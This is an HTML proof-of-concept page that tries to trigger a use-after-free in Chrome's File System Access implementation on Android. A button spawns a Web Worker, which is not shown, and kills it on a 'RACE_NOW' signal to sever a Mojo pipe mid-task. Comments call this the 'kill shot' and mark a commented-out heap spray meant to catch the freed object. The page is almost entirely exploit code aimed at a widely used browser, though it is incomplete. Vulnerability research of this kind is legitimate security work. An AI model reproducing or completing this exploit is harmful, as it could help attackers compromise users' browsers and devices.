<!DOCTYPE html>
<html>
<head>
    <title>FileSystemAccess UAF PoC (Stock Chrome)</title>
</head>
<body>
    <h1>Standard Web API Race Trigger</h1>
    <p>Testing on stock Android Chrome via OPFS and Web Workers.</p>
    <button id="trigger">Trigger UAF</button>

    <script>
        document.getElementById('trigger').onclick = async () => {
            console.log("[*] Spawning Web Worker...");
            
            // Spawn the worker
            const worker = new Worker('worker.js');

            // Listen for the exact moment to strike
            worker.onmessage = (e) => {
                if (e.data === "RACE_NOW") {
                    console.log("[*] Received signal. Terminating worker instantly!");
                    
                    // This is the kill shot. Terminating the worker instantly severs
                    // the Mojo Receiver pipe on the Browser process side, triggering
                    // the disconnect handler while the Async Task A is still running.
                    worker.terminate();
                    
                    console.log("[+] Worker terminated. Mojo pipe dropped. Browser should crash in std::set::find().");
                    
                    // Spray the heap here to catch the freed object
                    // sprayHeap();
                }
            };
        };
    </script>
</body>
</html>
